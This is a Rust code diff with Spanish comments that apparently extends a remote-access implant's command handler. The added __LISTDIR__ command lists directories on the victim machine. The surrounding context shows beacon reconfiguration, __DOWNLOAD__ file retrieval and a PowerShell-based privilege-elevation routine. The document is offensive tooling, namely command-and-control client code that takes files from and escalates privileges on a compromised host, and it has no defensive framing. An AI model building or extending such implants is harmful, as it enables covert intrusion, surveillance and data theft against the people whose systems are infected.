@@ -348,6 +348,10 @@ fn process_command(command: &str) -> String {
         let config_str = command.strip_prefix("__BEACON__:").unwrap_or("");
         debug_print!("DEBUG: Cambiando configuración beacon: {}", config_str);
         format!("__INFO__:Configuración de beacon recibida (se aplicará en próxima reconexión): {}{}", config_str, DELIMITER)
+    } else if command.starts_with("__LISTDIR__:") {
+        let path = command.strip_prefix("__LISTDIR__:").unwrap_or("");
+        debug_print!("DEBUG: Listando directorio: {}", path);
+        list_directory(path)
     } else if command.starts_with("__DOWNLOAD__:") {
         let path = command.strip_prefix("__DOWNLOAD__:").unwrap_or("");
         debug_print!("DEBUG: Descargando archivo: {}", path);
@@ -1117,6 +1121,47 @@ fn elevate_via_powershell(command: &str) -> String {
 #[cfg(not(target_os = "windows"))]
 fn elevate_command(command: &str) -> String {
     format!("__ERROR__:Elevación solo soportada en Windows{}", DELIMITER)
+}
+
+fn list_directory(dir_path: &str) -> String {
+    debug_print!("DEBUG: Listando directorio: {}", dir_path);
+    
+    match fs::read_dir(dir_path) {
+        Ok(entries) => {
+            let mut result = String::from("__DIRLIST__:");
+            let mut items = Vec::new();
+            
+            for entry in entries {
+                if let Ok(entry) = entry {
+                    let path = entry.path();
+                    let name = entry.file_name().to_string_lossy().to_string();
+                    
+                    let is_dir = path.is_dir();
+                    let size = if is_dir {
+                        0
+                    } else {
+                        fs::metadata(&path)
+                            .map(|m| m.len())
+                            .unwrap_or(0)
+                    };
+                    
+                    // Formato: type|name|size
+                    // type: D=directory, F=file
+                    let type_char = if is_dir { "D" } else { "F" };
+                    items.push(format!("{}|{}|{}", type_char, name, size));
+                }
+            }
+            
+            result.push_str(&items.join("\n"));
+            result.push_str(DELIMITER);
+            debug_print!("DEBUG: Listado completado, {} items", items.len());
+            result
+        }
+        Err(e) => {
+            debug_print!("DEBUG: Error listando directorio: {}", e);
+            format!("__ERROR__:No se pudo listar el directorio: {}{}", e, DELIMITER)
+        }
+    }
 }
 
 fn download_file(file_path: &str) -> String {
